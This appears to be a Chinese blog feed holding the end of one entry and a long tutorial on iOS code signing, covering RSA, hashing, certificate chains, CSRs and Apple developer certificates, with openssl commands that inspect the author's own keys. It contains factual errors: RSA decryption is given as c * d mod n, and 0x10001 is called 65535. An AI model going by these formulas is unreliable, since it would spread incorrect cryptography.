<p>理论上 <code>{n, e}</code> 和 <code>{n, d}</code> 可以互换，任何一个都可以是公钥或者私钥，加密和解密的函数也可以互换。但实践中，一般固定设置<code>e=65537(0x10001)</code>，相当于公开的一个约定，这样一来<code>{n, e}</code>就只能作为公钥使用。</p>

<h4>哈希算法</h4>

<p>也叫散列或者摘要算法，对一段任意长度的数据，通过一定的映射和计算，得到一个固定长度的值，这个值就被称为这段数据的哈希值(hash)。给定一个哈希算法，它一定具有以下特征：</p>

<ul>
<li>哈希值不同的两段数据绝对不同</li>
<li>相同的数据计算出的哈希值绝对相同</li>
<li>由于哈希值是固定长度， 也就意味着哈希值的数量是有限的。而任意数据都可以计算出一个哈希值，计算哈希的过程，相当于无限集到有限集的映射。因此哈希值相同，对应的原始数据不一定相同，如果不同，则称这两段数据存在<code>哈希碰撞</code>，实际应用中认为这是小概率事件(数学意义上的&#8221;不可能事件&#8221;)，优秀的哈希算法都是碰撞率<code>极低</code>的。</li>
<li>哈希算法是单向算法，无法通过哈希值，<code>计算</code>出原始数据，这一点非常重要！</li>
</ul>


<p>常见的哈希算法有: md5, sha1, sha256等，其中sha1长度为160bits，而sha256长度为256bits，二者相比，sha256的取值范围更大，因此碰撞和破解的概率更低，也就相对更安全。</p>

<h4>签名算法</h4>

<p>有了上面这两种算法作为基础，就可以组建一个签名和验证签名的体系了，如下图所示</p>

<p><img src="http://xelz.info/assets/2019/sign_verify.png" alt="签名与验证" /></p>

<p>假如<code>A</code>要给<code>B</code>发送一段数据<code>d</code>，先对其签名：</p>

<ul>
<li>计算<code>d</code>的哈希值<code>h</code>，并使用自己的私钥<code>a</code> 对 <code>h</code> 进行加密，得到的密文<code>c</code>就是签名</li>
</ul>


<p>得到签名后，将数据<code>d</code>和签名<code>c</code>通过某种方式发送给<code>B</code>，此时<code>B</code>收到了数据<code>d'</code>以及签名<code>c'</code>，需要验证这段数据是否被篡改，以及是否是<code>A</code>发送的</p>

<ul>
<li>计算<code>d'</code>的哈希值<code>h'</code>，使用<code>A</code>的公钥<code>b</code>将签名<code>c'</code>解密，得到<code>h''</code>。通过对比<code>h'</code>和<code>h''</code>是否一致，就可以知道数据或签名是否被篡改。并且，如果哈希值是匹配的，能够说明这段数据一定是由<code>A</code>签名并发出的</li>
</ul>


<p>常见的签名算法：</p>

<ul>
<li>sha1WithRSAEncryption：先对数据计算sha1摘要，再对摘要进行RSA加密</li>
<li>sha256WithRSAEncryption：先对数据计算sha256摘要，再对摘要进行RSA加密</li>
<li>md5WithRSAEncryption：先对数据计算MD5摘要，再对摘要进行RSA加密</li>
</ul>


<h4>证书</h4>

<p>上面这个例子中，任何需要接受<code>A</code>的消息的人都需要事先保存<code>A</code>的公钥。这样的方案存在一个很大的问题：公钥如何分发？如果<code>B</code>要接受来自很多不同来源的数据，不可能事先将所有来源的公钥都提前保存下来，并且这样无法适应来源变动(增加、删除、变更)等带来的变化。因此，一般会把公钥当做签名的一部分，随着数据一起分发，接收方不需要事先保存任何数据来源的公钥。</p>

<p><img src="http://xelz.info/assets/2019/sign_verify1.png" alt="" /></p>

<p>但是这样会引入一个新的问题：如何知道数据中所携带的公钥就是否是发送者自己的公钥？</p>

<p>这涉及到密钥的管理和分发，细节展开的话是一个非常大的课题。简单来说，可以把公钥和所有者的信息保存在一个文件里，并让一个可信的第三者使用其私钥对这个文件进行签名，得到一个签了名的公钥文件，这个文件就叫做<code>证书</code>。证书会作为签名的一部分，随着数据一起分发。</p>

<p><img src="http://xelz.info/assets/2019/cert_struct.png" alt="证书的结构" /></p>

<p>这里出现了一个有意思的事情，数据签名中的证书本身也是一段数据(公钥+所有者信息)以及其签名组成的，但证书中的签名是简单签名，一般只有哈希值和签发者名称，不会再将签发者的证书包含在签名中，否则就陷入无限递归的死循环了。</p>

<p>此时我们还需要使用第三者的公钥验证这个证书的合法性。虽然需要多验证一步，但是这样一来，本地不再需要保存每个数据来源的公钥，只需要保存这个第三者的证书(公钥)即可，每个数据来源的证书都由这个可信的第三者进行签发，这个可信的第三者就被称为证书颁发机构(Certification Authority)，简称<code>CA</code>。</p>

<p><img src="http://xelz.info/assets/2019/sign_struct.png" alt="签名的结构" /></p>

<p>实际上，CA的证书可能也是由其他更高一级的CA进行签发的，这种情况会产生3级甚至3级以上的证书链，系统中只需要保存最高级CA的证书，中间CA的证书和信息提供者的证书依次进行递归校验即可。</p>

<p>可以通过这个命令导出Xcode应用中可执行程序的签名证书，mac OS上的代码签名格式与iOS平台是相同的</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>codesign -d --extract-certificates<span class="o">=</span>cert /Applications/Xcode.app/Contents/MacOS/Xcode
</span></code></pre></td></tr></table></div></figure>


<p>当前文件夹下会产生三个证书文件<code>cert0</code> <code>cert1</code> <code>cert2</code>。其中cert0是由cert1签发的，可以使用cert1验证其合法性，同理cert2可以验证cert1的合法性。而对于cert2，只需要对比系统的keychain中是否有相同的证书文件即可。通过下面的命令可以分别查看他们的所有者名称：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="k">for </span>i in 0 1 2<span class="p">;</span> <span class="k">do </span>openssl x509 -inform DER -text -noout -in cert<span class="nv">$i</span> <span class="p">|</span> grep Subject:<span class="p">;</span> <span class="k">done</span>
</span><span class='line'><span class="k">        </span>Subject: <span class="nv">CN</span><span class="o">=</span>Apple Mac OS Application Signing, <span class="nv">O</span><span class="o">=</span>Apple Inc., <span class="nv">C</span><span class="o">=</span>US
</span><span class='line'>        Subject: <span class="nv">C</span><span class="o">=</span>US, <span class="nv">O</span><span class="o">=</span>Apple Inc., <span class="nv">OU</span><span class="o">=</span>Apple Worldwide Developer Relations, <span class="nv">CN</span><span class="o">=</span>Apple Worldwide Developer Relations Certification Authority
</span><span class='line'>        Subject: <span class="nv">C</span><span class="o">=</span>US, <span class="nv">O</span><span class="o">=</span>Apple Inc., <span class="nv">OU</span><span class="o">=</span>Apple Certification Authority, <span class="nv">CN</span><span class="o">=</span>Apple Root CA
</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[深度长文：细说iOS代码签名]]></title>
    <link href="http://xelz.info/blog/2019/01/11/ios-code-signature/"/>
    <updated>2019-01-11T11:12:14+08:00</updated>
    <id>http://xelz.info/blog/2019/01/11/ios-code-signature</id>
    <content type="html"><![CDATA[<h2>0x00 前言</h2>

<p>2008年苹果发布iOS2.0时引入了强制代码签名(Mandatory Code Signing)技术，为了能够严格控制设备上能够运行的代码，这为iOS设备的安全性和苹果的AppStore生态奠定了坚实的基础。作为iOSer总是要跟代码签名打交道的，相信大部分人对代码签名都是一知半解，本文将会由浅入深，深挖代码签名的内部细节。</p>

<h4>导航</h4>

<ul>
<li>一口气读完，大约需要40-60分钟

<ul>
<li><a href="http://xelz.info/blog/2019/01/11/ios-code-signature/">深度长文：细说iOS代码签名</a></li>
</ul>
</li>
<li>分步阅读

<ul>
<li><a href="http://xelz.info/blog/2019/01/11/ios-code-signature-1/">细说iOS代码签名(一)</a>：签名的作用及原理</li>
<li><a href="http://xelz.info/blog/2019/01/11/ios-code-signature-2/">细说iOS代码签名(二)</a>：开发者证书、Entitlements、Provisioning Profile</li>
<li><a href="http://xelz.info/blog/2019/01/11/ios-code-signature-3/">细说iOS代码签名(三)</a>：签名的过程及代码签名的数据结构</li>
<li><a href="http://xelz.info/blog/2019/01/11/ios-code-signature-4/">细说iOS代码签名(四)</a>：签名校验、越狱、重签名</li>
</ul>
</li>
</ul>


<!-- more -->


<h2>0x01 签名的作用</h2>

<p>数字签名其实跟我们手写的签名类似，代表一个特定的主体(签名者)对特定内容(被签名数据)的署名和认可，签名是对信息发送行为真实性的有效保障。数字签名在很多领域都有应用，iOS的代码签名正是其中最典型的一种，我们可以先尝试分析一下iOS上代码签名的目的和好处。</p>

<h4>安全性</h4>

<p>代码签名的首要任务是保证设备及系统的安全性，只有被苹果设备认可的证书签名的代码才能够被执行，否则在安装或者运行时会因为无法通过内核的签名校验而失败。iOS的系统中内置了来自苹果的CA证书，系统自身的代码都是被苹果”签名“过的， 而用户从AppStore下载的App也都已被苹果官方进行签名。签名机制可以有效地防止来自外部的攻击。</p>

<p>这里存在两种场景：</p>

<ul>
<li>第一种是对系统本身的攻击，比如越狱，假如黑客发现了内核任意读写的漏洞，借此注入提权代码，但是这些代码会因为没有合法的签名而被系统拒绝运行，也就自然无法对系统造成实质性的破坏。</li>
<li>第二种是对设备或者用户的攻击，众所周知，提交到AppStore的应用代码都会经过苹果的审查，包含恶意代码的App是无法上架的。此时，黑客可能会尝试先提交一个正常的App，通过各种技术手段躲避Apple的审查，上架后从网络上下载恶意代码并加载执行，但这种方式也会因为签名不合法而失败。</li>
</ul>


<h4>沙盒</h4>

<p>除了能够避免非授权的恶意代码运行，代码签名还可以有效地限制app的行为，这部分功能主要是由Sandbox机制来保证，但Sandbox的配置是绑定在签名中的，就是通常所说的Entitlements文件。试想，如果Entitlements文件可以被任意修改，那么Sandbox也就失去了意义，所以Entitlements文件也是强制签名保护的对象。对于越狱来说，如果无法绕过签名和Sandbox，再强大的提权漏洞也无计可施。</p>

<h4>垄断</h4>

<p>代码签名还给苹果带来了一个巨大的好处：App分发的绝对控制权。在iOS平台上(面向未越狱的用户)公开发行App的合法途径有且只有一种，就是上传到苹果官方的AppStore供用户下载。苹果会对App进行严格的审查并签名，App的功能及支付渠道也因此可以受苹果的严格管制，这为苹果带来的经济效益不言而喻。</p>

<h2>0x02 什么是签名</h2>

<p>签名的本质是用于验证数据的合法性，确保被签名的数据来自特定的来源，并且未经篡改。它基于非对称加密，和哈希算法，研究签名之前需要对这两种算法有一定的了解。</p>

<h4>公钥加密算法</h4>

<p>也叫非对称加密，它在加密和解密时使用的是不同的密钥，具有这样的特征：</p>

<ul>
<li>有一对密钥 <code>a</code> 和  <code>b</code> ，满足 <code>a ≠ b</code></li>
<li>用密钥<code>a</code>加密的数据只能用<code>b</code>进行解密，<code>a</code>自身无法解密，反之亦然</li>
<li>只知道其中一个密钥，无法推导出另一个</li>
<li>把其中一个可以公开的叫做公钥，另一个不能公开的叫做私钥。</li>
</ul>


<p><img src="http://xelz.info/assets/2019/pubkey_crypto.png" alt="公钥加密算法" /></p>

<p>最常见的公钥加密算法是RSA公钥加密算法，也是签名中普遍使用的算法。其数学原理如下：</p>

<ul>
<li>选定两个超大的素数<code>p</code>, <code>q</code>，并计算他们的乘积<code>n = p * q</code></li>
<li>计算欧拉函数 <code>φ(n) = φ(p) * φ(q) = (p-1) * (q-1)</code></li>
<li>随机选定一个数<code>e</code>，满足<code>1 &lt; e &lt; φ(n)</code> ，且与<code>φ(n)</code>互质</li>
<li>根据扩展欧几里得算法计算<code>e</code>对于<code>φ(n)</code>的乘法逆元<code>d</code> ，<code>e * d = 1 mod φ(n)</code></li>
<li><code>{n, e}</code> 和 <code>{n, d}</code> 分别组成这个算法的一对密钥</li>
<li>对于给定明文<code>p</code>,  若使用<code>{n, e}</code> 作为加密密钥，其密文计算方法为 <code>c = p ^ e mod n</code>

<ul>
<li>这是一个<code>单向函数</code>，已知<code>{c, n, e}</code> 无法计算出<code>p</code></li>
</ul>
</li>
<li>相应地需要使用<code>{n, d}</code>进行解密， <code>p' = c * d mod n</code>

<ul>
<li>这是上一步加密函数的<code>逆函数</code></li>
</ul>
</li>
<li>两组密钥中<code>n</code>是相同的，那么如果已知了<code>e</code>和<code>d</code>其中的一个，想要计算另一个，必须知道<code>φ(n)</code>，也就是必须先将<code>n</code>分解<code>质因数</code>，得到<code>p</code>和<code>q</code>，但由于<code>n</code>的值非常大，这样的计算量基本上是<code>不可能</code>的，也就保障了算法的安全性</li>
</ul>


<p>理论上 <code>{n, e}</code> 和 <code>{n, d}</code> 可以互换，任何一个都可以是公钥或者私钥，加密和解密的函数也可以互换。但实践中，一般固定设置<code>e=65537(0x10001)</code>，相当于公开的一个约定，这样一来<code>{n, e}</code>就只能作为公钥使用。</p>

<h4>哈希算法</h4>

<p>也叫散列或者摘要算法，对一段任意长度的数据，通过一定的映射和计算，得到一个固定长度的值，这个值就被称为这段数据的哈希值(hash)。给定一个哈希算法，它一定具有以下特征：</p>

<ul>
<li>哈希值不同的两段数据绝对不同</li>
<li>相同的数据计算出的哈希值绝对相同</li>
<li>由于哈希值是固定长度， 也就意味着哈希值的数量是有限的。而任意数据都可以计算出一个哈希值，计算哈希的过程，相当于无限集到有限集的映射。因此哈希值相同，对应的原始数据不一定相同，如果不同，则称这两段数据存在<code>哈希碰撞</code>，实际应用中认为这是小概率事件(数学意义上的&#8221;不可能事件&#8221;)，优秀的哈希算法都是碰撞率<code>极低</code>的。</li>
<li>哈希算法是单向算法，无法通过哈希值，<code>计算</code>出原始数据，这一点非常重要！</li>
</ul>


<p>常见的哈希算法有: md5, sha1, sha256等，其中sha1长度为160bits，而sha256长度为256bits，二者相比，sha256的取值范围更大，因此碰撞和破解的概率更低，也就相对更安全。</p>

<h4>签名算法</h4>

<p>有了上面这两种算法作为基础，就可以组建一个签名和验证签名的体系了，如下图所示</p>

<p><img src="http://xelz.info/assets/2019/sign_verify.png" alt="签名与验证" /></p>

<p>假如<code>A</code>要给<code>B</code>发送一段数据<code>d</code>，先对其签名：</p>

<ul>
<li>计算<code>d</code>的哈希值<code>h</code>，并使用自己的私钥<code>a</code> 对 <code>h</code> 进行加密，得到的密文<code>c</code>就是签名</li>
</ul>


<p>得到签名后，将数据<code>d</code>和签名<code>c</code>通过某种方式发送给<code>B</code>，此时<code>B</code>收到了数据<code>d'</code>以及签名<code>c'</code>，需要验证这段数据是否被篡改，以及是否是<code>A</code>发送的</p>

<ul>
<li>计算<code>d'</code>的哈希值<code>h'</code>，使用<code>A</code>的公钥<code>b</code>将签名<code>c'</code>解密，得到<code>h''</code>。通过对比<code>h'</code>和<code>h''</code>是否一致，就可以知道数据或签名是否被篡改。并且，如果哈希值是匹配的，能够说明这段数据一定是由<code>A</code>签名并发出的</li>
</ul>


<p>常见的签名算法：</p>

<ul>
<li>sha1WithRSAEncryption：先对数据计算sha1摘要，再对摘要进行RSA加密</li>
<li>sha256WithRSAEncryption：先对数据计算sha256摘要，再对摘要进行RSA加密</li>
<li>md5WithRSAEncryption：先对数据计算MD5摘要，再对摘要进行RSA加密</li>
</ul>


<h4>证书</h4>

<p>上面这个例子中，任何需要接受<code>A</code>的消息的人都需要事先保存<code>A</code>的公钥。这样的方案存在一个很大的问题：公钥如何分发？如果<code>B</code>要接受来自很多不同来源的数据，不可能事先将所有来源的公钥都提前保存下来，并且这样无法适应来源变动(增加、删除、变更)等带来的变化。因此，一般会把公钥当做签名的一部分，随着数据一起分发，接收方不需要事先保存任何数据来源的公钥。</p>

<p><img src="http://xelz.info/assets/2019/sign_verify1.png" alt="" /></p>

<p>但是这样会引入一个新的问题：如何知道数据中所携带的公钥就是否是发送者自己的公钥？</p>

<p>这涉及到密钥的管理和分发，细节展开的话是一个非常大的课题。简单来说，可以把公钥和所有者的信息保存在一个文件里，并让一个可信的第三者使用其私钥对这个文件进行签名，得到一个签了名的公钥文件，这个文件就叫做<code>证书</code>。证书会作为签名的一部分，随着数据一起分发。</p>

<p><img src="http://xelz.info/assets/2019/cert_struct.png" alt="证书的结构" /></p>

<p>这里出现了一个有意思的事情，数据签名中的证书本身也是一段数据(公钥+所有者信息)以及其签名组成的，但证书中的签名是简单签名，一般只有哈希值和签发者名称，不会再将签发者的证书包含在签名中，否则就陷入无限递归的死循环了。</p>

<p>此时我们还需要使用第三者的公钥验证这个证书的合法性。虽然需要多验证一步，但是这样一来，本地不再需要保存每个数据来源的公钥，只需要保存这个第三者的证书(公钥)即可，每个数据来源的证书都由这个可信的第三者进行签发，这个可信的第三者就被称为证书颁发机构(Certification Authority)，简称<code>CA</code>。</p>

<p><img src="http://xelz.info/assets/2019/sign_struct.png" alt="签名的结构" /></p>

<p>实际上，CA的证书可能也是由其他更高一级的CA进行签发的，这种情况会产生3级甚至3级以上的证书链，系统中只需要保存最高级CA的证书，中间CA的证书和信息提供者的证书依次进行递归校验即可。</p>

<p>可以通过这个命令导出Xcode应用中可执行程序的签名证书，mac OS上的代码签名格式与iOS平台是相同的</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>codesign -d --extract-certificates<span class="o">=</span>cert /Applications/Xcode.app/Contents/MacOS/Xcode
</span></code></pre></td></tr></table></div></figure>


<p>当前文件夹下会产生三个证书文件<code>cert0</code> <code>cert1</code> <code>cert2</code>。其中cert0是由cert1签发的，可以使用cert1验证其合法性，同理cert2可以验证cert1的合法性。而对于cert2，只需要对比系统的keychain中是否有相同的证书文件即可。通过下面的命令可以分别查看他们的所有者名称：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="k">for </span>i in 0 1 2<span class="p">;</span> <span class="k">do </span>openssl x509 -inform DER -text -noout -in cert<span class="nv">$i</span> <span class="p">|</span> grep Subject:<span class="p">;</span> <span class="k">done</span>
</span><span class='line'><span class="k">        </span>Subject: <span class="nv">CN</span><span class="o">=</span>Apple Mac OS Application Signing, <span class="nv">O</span><span class="o">=</span>Apple Inc., <span class="nv">C</span><span class="o">=</span>US
</span><span class='line'>        Subject: <span class="nv">C</span><span class="o">=</span>US, <span class="nv">O</span><span class="o">=</span>Apple Inc., <span class="nv">OU</span><span class="o">=</span>Apple Worldwide Developer Relations, <span class="nv">CN</span><span class="o">=</span>Apple Worldwide Developer Relations Certification Authority
</span><span class='line'>        Subject: <span class="nv">C</span><span class="o">=</span>US, <span class="nv">O</span><span class="o">=</span>Apple Inc., <span class="nv">OU</span><span class="o">=</span>Apple Certification Authority, <span class="nv">CN</span><span class="o">=</span>Apple Root CA
</span></code></pre></td></tr></table></div></figure>


<h2>0x03 开发者证书</h2>

<p>在了解了签名和证书的基本结构之后，我们来研究一下iOS的开发者证书，它是开发过程中必不可少的东西，相信大家都有接触。众所周知，iOS设备并不能像Android那样任意地安装app，app必须被Apple签名之后才能安装到设备上。而开发者在开发App的时候需要频繁地修改代码并安装到设备上进行测试，不可能每次都先上传给Apple进行签名，因此需要一种不需要苹果签名就可以运行的机制。这个机制的实现方式是：</p>

<ul>
<li>开发者自己持有一套密钥和证书，可以自行对app进行签名</li>
<li>由Apple对开发者的身份进行“背书”，让设备间能够接信任开发者自行签名的app，这个“背书”的方式就是后面会提到的<code>Provisioning Profile</code></li>
</ul>


<p>那么先研究一下开发者证书是如何产生的：在Xcode 8及之后的版本，Xcode会自动帮我们管理证书，我们可能根本不会有机会去研究它，但是在早期的版本中，需要我们自己动手操作，获取开发者证书主要有两个步骤</p>

<h4>生成CSR文件(Certificate Signing Request)</h4>

<p>在Keychain菜单栏选择&#8221;从证书颁发机构请求证书&hellip;&#8221;</p>

<p><img src="http://xelz.info/assets/2019/csr1.png" alt="csr1" /></p>

<p><img src="http://xelz.info/assets/2019/csr2.png" alt="csr2" /></p>

<p>这个操作会产生一个名为<code>CertificateSigningRequest.certSigningRequest</code> 的签名请求文件，在生成这个文件之前其实Keychain已经自动生成了一对公、私钥</p>

<p><img src="http://xelz.info/assets/2019/csr3.png" alt="csr3" /></p>

<p><img src="http://xelz.info/assets/2019/csr4.png" alt="csr4" /></p>

<p>可以在Keychain中选中这个条目，右键选择导出，将密钥文件导出为p12文件，使用openssl查看其内容</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>openssl pkcs12 -in JustForTesting.p12 -out private_key.pem  <span class="c"># 导出p12文件中的密钥</span>
</span><span class='line'>Enter Import Password:    <span class="c"># 输入p12文件的密码</span>
</span><span class='line'>MAC verified OK
</span><span class='line'>Enter PEM pass phrase:    <span class="c"># 设定导出的密钥文件的密码</span>
</span><span class='line'>Verifying - Enter PEM pass phrase:    <span class="c"># 确认密码</span>
</span><span class='line'><span class="nv">$ </span>openssl rsa -in private_key.pem -noout -text  <span class="c"># 查看密钥文件的内容</span>
</span><span class='line'>Enter pass phrase <span class="k">for </span>private_key.pem:   <span class="c"># 输入密钥文件的密码</span>
</span><span class='line'>Private-Key: <span class="o">(</span>2048 bit<span class="o">)</span>
</span><span class='line'>modulus:
</span><span class='line'>    00:c2:98:f5:02:eb:dc:a6:fd:4b:12:4c:70:17:a6:
</span><span class='line'>    xx:xx:xx:xx:xx:xx:xx:...
</span><span class='line'>publicExponent: 65537 <span class="o">(</span>0x10001<span class="o">)</span>
</span><span class='line'>privateExponent:
</span><span class='line'>    00:a1:67:68:e1:51:6c:a4:fd:36:45:29:2d:58:10:
</span><span class='line'>    xx:xx:xx:xx:xx:xx:xx:...
</span><span class='line'>prime1:
</span><span class='line'>    00:f3:91:5d:5b:dc:c1:de:d2:ab:7a:5f:b2:27:41:
</span><span class='line'>    xx:xx:xx:xx:xx:xx:xx:...
</span><span class='line'>prime2:
</span><span class='line'>    00:cc:87:b5:c9:7e:81:39:94:13:c1:ff:3f:d7:7b:
</span><span class='line'>    xx:xx:xx:xx:xx:xx:xx:...
</span><span class='line'>exponent1:
</span><span class='line'>    00:a5:a0:22:c0:f5:d3:eb:86:8c:4e:b1:c6:3e:85:
</span><span class='line'>    xx:xx:xx:xx:xx:xx:xx:...
</span><span class='line'>exponent2:
</span><span class='line'>    00:8b:e1:00:85:a6:7c:10:79:e2:2d:5a:39:3a:51:
</span><span class='line'>    xx:xx:xx:xx:xx:xx:xx:...
</span><span class='line'>coefficient:
</span><span class='line'>    7e:30:60:84:fc:47:6b:90:fe:e7:32:1a:2f:b0:c4:
</span><span class='line'>    xx:xx:xx:xx:xx:xx:xx:...
</span></code></pre></td></tr></table></div></figure>


<p>这里出现了几个熟悉的面孔：</p>

<ul>
<li>prime1/prime2 就是生成密钥所使用的两个超大的素数<code>p, q</code></li>
<li>modulus 是这两个超大素数的乘积 <code>n = p * q</code></li>
<li>publicExponent 是公钥因子，也就是前文中的<code>e</code>, 这里固定为 0x10001 (65535)</li>
<li>privateExponent 是私钥因子，即前文中的<code>d</code></li>
</ul>


<p>CSR文件的内容其实就是个人信息、公钥(Modulus + PublicExponent)，以及自签名(使用自己的私钥进行签名)， 可通过openssl命令查看其内容：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>openssl req -in ~/Desktop/CertificateSigningRequest.certSigningRequest -text -noout
</span><span class='line'>Certificate Request:
</span><span class='line'>    Data:
</span><span class='line'>        Version: 0 <span class="o">(</span>0x0<span class="o">)</span>
</span><span class='line'>        Subject: <span class="nv">emailAddress</span><span class="o">=</span>me@xelz.info, <span class="nv">CN</span><span class="o">=</span>JustForTesting, <span class="nv">C</span><span class="o">=</span>CN
</span><span class='line'>        Subject Public Key Info:
</span><span class='line'>            Public Key Algorithm: rsaEncryption
</span><span class='line'>                Public-Key: <span class="o">(</span>2048 bit<span class="o">)</span>
</span><span class='line'>                Modulus:
</span><span class='line'>                    00:c2:98:f5:02:eb:dc:a6:fd:4b:12:4c:70:17:a6:
</span><span class='line'>                    xx:xx:xx:xx:xx:xx:xx:...
</span><span class='line'>                Exponent: 65537 <span class="o">(</span>0x10001<span class="o">)</span>
</span><span class='line'>        Attributes:
</span><span class='line'>            a0:00
</span><span class='line'>    Signature Algorithm: sha256WithRSAEncryption
</span><span class='line'>         b7:11:aa:48:2f:b3:10:e9:71:c7:93:c3:ec:44:8d:0f:a0:5a:
</span><span class='line'>         xx:xx:xx:xx:xx:xx:xx:...
</span></code></pre></td></tr></table></div></figure>


<h4>提交给Apple进行签名</h4>

<p>在苹果开发者网站，将CSR提交给Apple进行签名，Apple会返回一个签好名的<code>证书文件</code>，后缀名为<code>cer</code>。</p>

<p>先查看一下他的<code>sha1</code>值，后面会用到</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>shasum ios_development.cer
</span><span class='line'>11447116f2c5521b057b9b67290f0fdadeadfa0a  ios_development.cer
</span></code></pre></td></tr></table></div></figure>


<p>双击即可将其导入到Keychain中，Keychain会自动把它之前创建CSR时自动生成的密钥归为一组。无论是在证书列表中查看还是在密钥列表中查看，都能看到与之匹配的<code>另一半</code>。</p>

<p><img src="http://xelz.info/assets/2019/csr5.png" alt="" /></p>

<p>查看证书的内容</p>

<p><img src="http://xelz.info/assets/2019/cert1.png" alt="" /></p>

<p>可以从证书中得到几个关键信息：</p>

<ol>
<li>证书的所有者，这部分信息并非由我们自行指定，而是签发者Apple根据我们的账号信息自动生成</li>
<li>证书的签发者，即前文所述的<code>CA</code></li>
<li>证书的公钥信息，与之前生成的密钥文件及CSR完全一致</li>
</ol>


<p>现在应该可以理解证书和密钥的关系了，密钥中保存了私钥和公钥，私钥用于签名，而证书里面有且只有公钥，并且是被第三方<code>CA</code> &ldquo;认证&rdquo; 过，用于解密和校验。</p>

<p>图中可以看到这个证书的签发者是<code>Apple Worldwide Developer Relations Certification Authority</code>，在Keychain中搜索这个名字， 可以看到它的证书详情。我们会发现，它的类型是<code>中级证书颁发机构(中级CA)</code>，它也包含签名，并且是由另外一个叫做<code>Apple Root CA</code>的<code>根证书颁发机构(根CA)</code>进行签发的，这样就形成了一条证书链。而继续查看<code>Apple Root CA</code>的证书，会发现它是自签名的，因为它会被内置在设备中，设备无条件信任它，也就不需要其他的机构为其背书了。</p>

<p><img src="http://xelz.info/assets/2019/cert2.png" alt="" /></p>

<p>这样的证书链机制可以简化根证书颁发机构的工作，同时提升证书管理的安全性。将颁发底层证书的工作分散给多个中级证书颁发机构进行处理，根证书颁发机构只需要对下一级机构的证书进行管理和签发，降低根证书颁发机构私钥的使用频率，也就降低了私钥泄露的风险。中级证书颁发机构各司其职，即使出现私钥泄露这样的重大安全事故，也不至于波及整个证书网络。</p>

<h4>开发证书与发布证书</h4>

<p>开发者证书按用途可分为Development证书和Distribution证书：</p>

<ul>
<li>Development证书是用于开发及测试阶段使用的证书，它用于在设备安装上开发阶段的App后对App的完整性进行校验，一般证书名称为 iPhone Developer: xxxxxxx。如果是多人协作的开发者账号，任意成员都可以申请自己的Development证书。</li>
<li>Distribution证书是用于提交AppStore的证书，一般命名为 iPhone Distribution: xxxxxxxxx，用于让AppStore校验提交上来的App的完整性，只有管理员以上身份的开发者账号才可以申请，因此可以控制提交权限的范围。同时，Distribution证书不能用于开发及调试。</li>
</ul>


<h4>企业级开发者证书</h4>

<p>除了普通开发者证书(个人开发者账号和公司开发者账号使用的证书)外，还有一种特殊的<code>企业级开发者证书</code>，这种证书签名的App可以被直接安装在任意的iOS设备上，只要用户主动信任该证书即可。它的作用是方便企业给内部员工分发生产力工具，比如往往存在这样一些场景：企业内部无法访问互联网，自然也就无法通过AppStore安装应用，或是使用私有API，完成一些AppStore不允许的功能。前面所说的不需要苹果签名即可安装运行的机制同样适用于企业级开发者证书，并且是企业级开发者证书的基础。</p>

<p>从证书的申请方式和内容来看，企业级开发者证书和普通开发者证书并无不同，只是开发者账号的申请方式和费用有区别。此外，Apple对这两种证书所能提供的Provisioning Profile有细微的差异，下一节马上就会分析。</p>

<h2>0x04 Entitlements &amp; Provisioning Profile</h2>

<p>除了开发者证书，在进行iOS代码签名的时候还需要有这两个文件，他们是被签名内容的一部分</p>

<h4>Entitlements</h4>

